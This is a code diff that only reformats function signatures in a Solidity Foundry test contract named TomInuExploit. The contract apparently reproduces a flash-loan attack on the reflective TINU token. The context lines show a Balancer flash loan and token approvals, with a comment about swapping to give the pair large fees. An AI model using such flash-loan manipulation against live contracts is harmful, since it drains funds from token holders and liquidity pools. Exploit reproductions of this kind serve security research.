@@ -35,12 +35,9 @@ contract TomInuExploit is Test {
         balancerVault.flashLoan(address(this), tokens, amounts, "");
     }
 
-    function receiveFlashLoan(
-        reflectiveERC20[] memory,
-        uint256[] memory amounts,
-        uint256[] memory,
-        bytes memory
-    ) external {
+    function receiveFlashLoan(reflectiveERC20[] memory, uint256[] memory amounts, uint256[] memory, bytes memory)
+        external
+    {
         // swapp WETH for TINU to give Pair large fees
         WETH.approve(address(router), type(uint256).max);
         TINU.approve(address(router), type(uint256).max);
@@ -107,12 +104,8 @@ interface IWETH {
 
 interface IBalancerVault {
 
-    function flashLoan(
-        address recipient,
-        address[] memory tokens,
-        uint256[] memory amounts,
-        bytes memory userData
-    ) external;
+    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
+        external;
 
 }
 
